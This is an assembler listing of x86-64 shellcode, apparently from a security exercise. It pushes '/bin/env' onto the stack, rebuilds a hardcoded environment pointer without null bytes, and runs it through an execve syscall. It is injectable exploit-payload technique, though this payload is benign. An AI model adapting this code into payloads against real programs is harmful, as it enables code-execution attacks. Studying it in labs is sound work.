     1                                            bits 64
     2                                              ; find out where we are
     3                                              ; your code starts here
     4 00000000 4831C0                  start:      xor rax, rax
     5                                  
     6                                              ; put name of command to run on stack
     7                                              ; push 0 - clearing register results in zero value
     8 00000003 50                                  push rax
     9                                              ; push '/bin/env'
    10 00000004 4831C0                              xor rax, rax
    11 00000007 48B82F62696E2F656E-                 mov rax, '/bin/env'
    11 00000010 76                 
    12 00000011 50                                  push rax
    13                                  
    14                                              ; put address of command in rdi
    15 00000012 4889E7                              mov rdi, rsp
    16                                  
    17                                              ; create the argv array
    18                                              ; push 0
    19 00000015 4831C0                              xor rax, rax
    20 00000018 50                                  push rax
    21 00000019 57                                  push rdi
    22                                  
    23                                              ; put the address of the argv array in rsi
    24 0000001A 4889E6                              mov rsi, rsp
    25                                  
    26                                              ; environ address 0x7ffff7fbe600
    27                                              ; clear the rdx register
    28 0000001D 4831D2                              xor rdx, rdx
    29                                              ; load 0x7fff into low 16 bits of rdx (dx)
    30 00000020 66BAFF7F                            mov dx, 0x7fff
    31                                              ; left shift the rdx register by 32 bits
    32 00000024 48C1E220                            shl rdx, 32
    33                                              ; load 0xf7fbe600 into low 32 bits of rcx (ecx)
    34 00000028 B9FFE6FBF7                          mov ecx, 0xf7fbe6ff
    35                                              ; clear low 8 bits of rcx (cl)
    36 0000002D 30C9                                xor cl, cl
    37                                              ; combine registers using or
    38 0000002F 4809CA                              or rdx, rcx
    39                                              ; load rdx with memory pointed by rdx
    40 00000032 488B12                              mov rdx, [rdx]
    41                                  
    42                                              ; set up system call
    43 00000035 4831C0                              xor rax, rax
    44 00000038 B03B                                mov al, 0x3B
    45 0000003A 0F05                                syscall
    46                                  
    47                                              ; exit system call
    48 0000003C B03C                                mov al, 0x3c
    49 0000003E 4889C7                              mov rdi, rax
    50 00000041 0F05                                syscall
    51                                  
    52                                              ; space for data so stack
    53                                              ; does not overflow the code
    54 00000043 FFFFFFFFFFFFFFFF                    dq 0xffffffffffffffff
    55 0000004B FFFFFFFFFFFFFFFF                    dq 0xffffffffffffffff
    56 00000053 FFFFFFFFFFFFFFFF                    dq 0xffffffffffffffff
    57 0000005B FFFFFFFFFFFFFFFF                    dq 0xffffffffffffffff
    58 00000063 FFFFFFFFFFFFFFFF                    dq 0xffffffffffffffff
    59 0000006B 6B000000                end:        dd end-start
    60                                  
    61                                  ; rdi is the path to command to be executed -> "/bin/env"
    62                                  ; rsi is the pointer to the argv array adress -> argv[0] is name of command
    63                                  ; rdx is the pointer to environment array address -> "0x7ffff7fbe600"
